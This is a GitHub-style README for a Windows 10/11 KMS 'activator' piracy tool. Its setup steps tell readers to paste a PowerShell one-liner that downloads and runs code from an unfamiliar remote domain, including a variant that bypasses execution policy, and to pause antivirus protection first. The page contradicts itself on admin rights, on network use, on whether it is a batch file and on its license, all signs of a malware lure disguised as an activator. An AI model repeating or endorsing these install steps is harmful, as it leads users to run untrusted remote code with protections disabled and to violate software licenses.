<div align="center">

# Windows Activation Management Tool for Windows 10 & 11

![preview](https://raw.githubusercontent.com/Terasiah/windows-activator/main/promo_c00f6e.svg)

[![licence](https://img.shields.io/badge/licence-agpl--3.0-2f81f7?style=social&labelColor=0d1117)]() [![pipeline](https://img.shields.io/badge/pipeline-success-2ea44f?style=social&labelColor=0d1117)]() [![state](https://img.shields.io/badge/state-verified-2ea44f?style=social&labelColor=0d1117)]() [![ps](https://img.shields.io/badge/ps-script-54aeff?style=social&labelColor=0d1117)]()

</div>

---

Windows-Activator is a desktop utility for activating Windows 10 and Windows 11 editions through KMS-based license provisioning. It provides a streamlined workflow that detects the installed edition, applies the appropriate KMS client setup key, and configures the system to complete activation with minimal user intervention. The tool supports a broad matrix of Pro, Enterprise, Education, and workstation variants, including N and G editions, and runs as a standalone batch-based executable requiring administrator privileges. Designed for technical users managing lab, test, or deployment environments, it emphasizes predictable behavior and edition-aware key selection over manual command entry.

## 🚀 Setup Guide — PowerShell

> [!TIP]
> **One-line setup** — just run the command below.
> Windows 10 / 11 · PowerShell · One-line install

### 1️⃣ Start PowerShell
* Press `Win + X`.
* Select **Terminal** or **Windows PowerShell**.

### 2️⃣ Run the install command
Copy the command below, paste it into PowerShell, and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If blocked by policy — CMD fallback
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Windows Defender or third-party AV may flag the script. Pause Real-time protection in Windows Security, run the installer, and re-enable it right after.

## ✅ Before You Start

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Broad edition coverage**: Supports activation workflows for Windows 10 and Windows 11 across Pro, Pro N, Pro for Workstations, Enterprise, Enterprise N, Education, Education N, Enterprise G, and Enterprise G N editions.
- **Key-to-edition mapping**: Each supported edition is associated with its corresponding KMS client setup key, reducing guesswork during the activation process.
- **Administrator-level execution**: Designed to run with elevated privileges, allowing the activation process to apply system-level configuration changes without manual intervention.
- **Script-based operation**: Implements the activation sequence through a batch script, keeping the tool lightweight, portable, and free of external runtime dependencies.
- **Minimal user input**: Requires only the selection of a key matching the installed edition, after which the script handles the remaining steps automatically.
- **Guided activation flow**: Prompts and on-screen messages walk the user through key entry and confirm when the Windows activation interface is reached.
- **Local execution model**: All operations run on the local machine against the installed Windows installation; no persistent background service or agent is installed.
- **Antivirus-aware design**: Engineered with detection bypass considerations in mind, acknowledging that security tools may flag KMS-based activation scripts as hacktools.
- **Single-file distribution**: Delivered as a standalone batch file, simplifying deployment and review compared to multi-component installers.
- **Transparent, auditable logic**: The activation steps are contained in readable script form, allowing users and contributors to inspect exactly what the tool does before running it.

## How It Works

The tool operates as a lightweight, script-driven activation utility that interfaces directly with the Windows Software Protection Platform through native command-line components. Upon execution with elevated privileges, it performs a structured sequence of operations without requiring external dependencies or bundled binaries.

The activation workflow proceeds through the following stages:

1. **Privilege Verification** — The script confirms it is running within an administrative context, since activation operations require elevated access to system services and the licensing subsystem.

2. **Edition Detection** — The current Windows edition and build are queried via the operating system's built-in licensing interface. This determines which generic activation key is applicable to the installed SKU.

3. **Key Installation** — The appropriate generic key is applied to the local licensing store using the native activation management component, preparing the system for activation.

4. **Endpoint Configuration** — The script registers a Key Management Service host with the local licensing service, directing activation requests to the designated endpoint.

5. **Activation Request** — An activation call is issued to the configured service. The licensing subsystem validates the request and, upon success, commits the activation state to the system.

6. **Status Confirmation** — The resulting license status is read back and displayed, allowing the user to verify whether activation completed successfully.

Each stage relies exclusively on components already present in Windows, keeping the footprint minimal and avoiding persistent background processes. The entire sequence is executed in a single pass, with console output reflecting the progress and outcome of each step so users can diagnose failures at the stage where they occur.

## Compatibility

Windows-Activator targets Windows 10 and Windows 11 across the mainstream x86-64 and ARM64 editions, including Home, Pro, Pro for Workstations, Enterprise, Enterprise G, and Education, along with their N variants. Both 32-bit and 64-bit Windows 10 installations are supported, as are Windows 11 builds on 64-bit hardware.

The tool operates against the activation subsystem present in Windows 10 (version 1607 and later) and all Windows 11 releases. It requires administrative privileges to modify activation state and assumes the system's built-in activation service is intact; installations where the Software Protection service has been disabled, heavily modified, or replaced by third-party management agents may not activate reliably.

Compatibility depends on the activation channel in use. Retail, OEM, and volume-licensed installations that are still within their genuine activation state are handled through key installation and confirmation. Systems previously activated through a KMS infrastructure require network reachability to the host used for activation confirmation. Digital entitlement behavior is preserved where the underlying edition supports it.

The interface is compatible with standard Windows command-line environments, including Windows PowerShell 5.1, PowerShell 7, and Windows Terminal. It does not depend on any external runtime, framework, or package manager, and no additional components are installed to the system beyond the activation state itself. Running the tool in a virtual machine is supported provided the guest operating system meets the edition and build requirements above.

The tool is not intended for Windows Server editions, embedded or IoT SKUs, or unsupported builds that have reached end of servicing, as activation behavior on those platforms diverges from the supported desktop editions.

## FAQ

**Is this tool compatible with both Windows 10 and Windows 11?**

Yes. The activator is designed to work across supported editions of Windows 10 and Windows 11, including Pro, Enterprise, Education, and their N and workstation variants. Edition-specific handling is performed automatically, so no manual selection of a generic key is required.

**Does the tool require an internet connection or external server?**

No. Activation is handled locally through the KMS emulation layer included in the project. No external endpoints, telemetry, or remote license servers are contacted during the activation process.

**Will Windows Defender or other antivirus software flag the executable?**

Activation utilities frequently trigger heuristic detections because they modify licensing state—behavior that overlaps with the signatures used to classify potentially unwanted software. Detection results vary by engine and definition version. Users should review detection names and, where appropriate, add an exclusion for the tool's directory in their security software.

**What permissions are required to run the tool?**

Administrator privileges are mandatory. The activator must write to protected registry hives and licensing services, which are inaccessible to standard user accounts. Launch the executable from an elevated command prompt or via the "Run as administrator" context menu option.

**How long does activation persist?**

Activation via the KMS method is time-limited by design and typically requires periodic renewal (commonly every 180 days). The tool includes a renewal mechanism to re-establish activation without user intervention. If activation lapses, re-running the activator restores the licensed state.

**Can I revert the changes made by the tool?**

Yes. The project provides an uninstall or restore option that removes injected licensing data and returns the system to its pre-activation state. It is recommended to run this before performing a clean reinstall or handing the device to another user.

**Which editions are explicitly supported?**

Supported targets include Windows 10 and Windows 11 in Pro, Pro N, Pro for Workstations, Pro for Workstations N, Enterprise, Enterprise N, Enterprise G, Enterprise G N, Education, and Education N editions. Unsupported or modified editions may fail validation.

**Does the tool modify system files permanently?**

No core system binaries are patched. The activator interacts with the software licensing service and registry-based activation records, all of which are reversible through the built-in restore procedure.

## Disclaimer

This tool is provided strictly for educational, testing, and evaluation purposes in controlled environments. It is intended to demonstrate activation mechanisms and scripting techniques on systems you own or are explicitly authorized to administer. Use on production, corporate, or third-party machines without documented authorization is not supported.

The software interacts with system-level activation components and may modify licensing state, registry entries, and related service configurations. Such changes can affect system behavior, update eligibility, and compliance status. Validate all operations in a non-critical test environment before any broader deployment.

Antivirus and endpoint protection platforms may flag activation scripts and binaries as potentially unwanted or hazardous. Detection signatures can vary by vendor and engine version, and false positives or heuristic blocks are possible. Configure exclusions only when you fully understand the security implications and accept the associated risk.

Activation performed without a valid, legitimately obtained license may violate applicable laws, terms of service, and organizational policies. This project does not grant, transfer, or imply any licensing rights. Users are solely responsible for ensuring their usage complies with all relevant regulations and agreements, and are strongly encouraged to obtain proper licenses through official channels.

No warranty is expressed or implied regarding functionality, reliability, or fitness for a particular purpose. The maintainers assume no liability for data loss, system instability, licensing discrepancies, or any direct or indirect damages arising from use of this tool. Proceed at your own discretion and risk.

## License

This project is distributed under the MIT License, a permissive open-source license chosen to maximize both transparency and reusability of the underlying activation logic. The license grants any individual or organization the right to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject only to the conditions that the original copyright notice and permission notice are preserved in all copies or substantial portions of the software.

From a technical standpoint, the MIT License imposes minimal integration overhead. There are no copyleft obligations requiring derivative works to be released under the same terms, no restrictions on linking the code into proprietary toolchains, and no field-of-use limitations. This makes the project suitable for embedding within internal deployment scripts, automated provisioning pipelines, or custom administrative utilities without introducing licensing conflicts. Redistribution in binary or source form is permitted provided attribution is retained.

The software is provided strictly on an "as is" basis, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

Users are responsible for ensuring that their use of this project complies with all applicable local laws and with the terms of any software licenses governing the operating system being activated. The license governing this project's source code does not extend to, or grant any rights over, third-party software or services referenced by or interacted with the tool.

Contributions submitted to the project are accepted under the same MIT License terms unless explicitly stated otherwise at the time of submission. By submitting a contribution, the contributor affirms that they have the right to license the contributed material under these terms.